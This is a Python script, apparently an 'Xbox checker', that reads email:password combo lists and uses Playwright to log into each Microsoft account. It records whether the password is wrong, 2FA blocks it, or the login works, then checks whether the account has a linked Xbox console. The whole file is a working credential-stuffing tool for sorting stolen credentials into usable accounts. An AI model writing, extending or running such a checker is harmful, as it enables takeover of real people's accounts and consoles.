# xbox_checker.py - يدعم النافذة المنبثقة والحقل العادي مع سجلات تصحيح
import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 120000  # زيادة المهلة

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-popup-blocking'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = await context.new_page()

        # فتح صفحة تسجيل الدخول
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles&id=292540"
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        print(f"✅ [{account['email']}] صفحة تسجيل الدخول تحمّلت")

        # إدخال البريد
        email_input = await page.wait_for_selector("input[type='email'], input[name='loginfmt']", timeout=15000)
        await email_input.fill(account['email'])
        await asyncio.sleep(1)
        print(f"📧 [{account['email']}] تم إدخال البريد")

        # الضغط على Next
        next_button = await page.wait_for_selector("input[type='submit'], input#idSIButton9", timeout=10000)
        print(f"⏳ [{account['email']}] جاري الضغط على Next...")
        
        # محاولة التعامل مع النافذة المنبثقة أولاً
        popup_handled = False
        try:
            async with page.context.expect_page(timeout=10000) as popup_info:
                await next_button.click()
            popup = await popup_info.value
            await popup.wait_for_load_state()
            print(f"🪟 [{account['email']}] تم اكتشاف نافذة منبثقة!")
            # إدخال كلمة المرور في النافذة
            password_field = await popup.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
            await password_field.fill(account['password'])
            await asyncio.sleep(1)
            submit_btn = await popup.wait_for_selector("input[type='submit'], input#idSIButton9", timeout=5000)
            await submit_btn.click()
            await popup.wait_for_load_state()
            await popup.close()
            popup_handled = True
            print(f"✅ [{account['email']}] تم تسجيل الدخول عبر النافذة المنبثقة")
        except Exception as e:
            print(f"⚠️ [{account['email']}] لم تظهر نافذة منبثقة أو فشلت: {e}")
            # إذا لم تظهر نافذة، نتعامل مع الحقل العادي في نفس الصفحة
            try:
                # قد يكون بعد الضغط على Next انتقلت الصفحة إلى حقل كلمة المرور
                await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
                await page.fill("input[type='password'], input[name='passwd']", account['password'])
                await asyncio.sleep(1)
                submit_btn = await page.wait_for_selector("input[type='submit'], input#idSIButton9", timeout=5000)
                await submit_btn.click()
                popup_handled = True
                print(f"✅ [{account['email']}] تم تسجيل الدخول عبر الحقل العادي")
            except Exception as e2:
                print(f"❌ [{account['email']}] فشل إدخال كلمة المرور: {e2}")
                # قد تكون هناك رسالة خطأ (2FA أو كلمة مرور خاطئة)
                body = await page.inner_text('body')
                if "enter code" in body.lower() or "verification" in body.lower():
                    result['console_info'] = "يتطلب رمز التحقق (2FA)"
                elif "incorrect" in body.lower():
                    result['console_info'] = "كلمة مرور خاطئة"
                else:
                    result['console_info'] = "فشل في إدخال كلمة المرور"
                await browser.close()
                await p.stop()
                return result

        if not popup_handled:
            result['console_info'] = "لم يتم التعامل مع كلمة المرور"
            await browser.close()
            await p.stop()
            return result

        # انتظار بعد تسجيل الدخول
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(3)

        # التعامل مع "Stay signed in?"
        try:
            yes_btn = await page.wait_for_selector("input[value='Yes'], button:has-text('Yes')", timeout=5000)
            await yes_btn.click()
            print(f"✅ [{account['email']}] تم تأكيد البقاء مسجلاً")
        except:
            pass

        # التحقق من وجود جهاز
        console_url = "https://www.xbox.com/en-US/play/consoles"
        has_console = False
        console_info = "لم يتم العثور على جهاز"
        login_success = False

        for attempt in range(3):
            try:
                await page.goto(console_url, timeout=60000)
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(2)
                text = (await page.inner_text('body')).lower()
                if "play your console remotely" in text:
                    has_console = True
                    console_info = "يوجد جهاز"
                    login_success = True
                    break
                elif "set up your console" in text:
                    has_console = False
                    console_info = "مسجل ولا يوجد جهاز"
                    login_success = True
                    break
                elif "sign in to finish setting up" in text:
                    has_console = False
                    console_info = "تسجيل دخول غير مكتمل"
                    login_success = False
                    break
            except Exception as e:
                print(f"⚠️ محاولة {attempt+1} فشلت: {e}")
                continue

        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info

        await browser.close()
        await p.stop()

    except PlaywrightTimeoutError as e:
        result['console_info'] = f"انتهت المهلة: {str(e)[:80]}"
        if p:
            await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()

    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
